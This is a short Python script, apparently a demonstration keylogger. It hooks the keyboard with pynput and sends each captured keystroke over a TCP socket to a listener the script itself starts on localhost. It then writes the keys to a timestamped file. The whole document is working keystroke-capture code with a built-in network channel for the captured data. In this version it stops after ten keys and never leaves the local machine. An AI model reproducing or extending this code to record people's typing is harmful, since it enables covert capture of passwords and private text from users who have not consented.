import os
from datetime import datetime
from pynput import keyboard
import socket
import threading

HOST = '127.0.0.1'
PORT = 65432

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        conn, addr = s.accept()
        with conn:
            print(f"Server connected by {addr}")
            while True:
                data = conn.recv(1024)
                if not data: break
                print(f"Server received: {data.decode('utf-8')}")

def send_keystroke(key):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))
            s.sendall(key.encode('utf-8'))
        except ConnectionRefusedError:
            pass

def create_output_folder():
    folder_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    os.makedirs(folder_name, exist_ok=True)
    return folder_name

def save_keystrokes(folder_name, keystrokes):
    with open(os.path.join(folder_name, "keystrokes.txt"), "w") as f:
        for i,k in enumerate(keystrokes,1):
            f.write(f"{i}: {k}\n")

def on_press(key, keystrokes, max_keys):
    try:
        keystrokes.append(key.char)
    except AttributeError:
        keystrokes.append(str(key))
    send_keystroke(str(keystrokes[-1]))
    if len(keystrokes) >= max_keys:
        return False
def capture_keystrokes(max_keys=10):
    keys = []
    with keyboard.Listener(on_press=lambda key: on_press(key, keys, max_keys)) as listener:
        listener.join()
    return keys

# --- Main ---
if __name__ == "__main__":
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()

    folder = create_output_folder()
    keys = capture_keystrokes(max_keys=10)
    save_keystrokes(folder, keys)
    print(f"Keystrokes saved in {folder}")
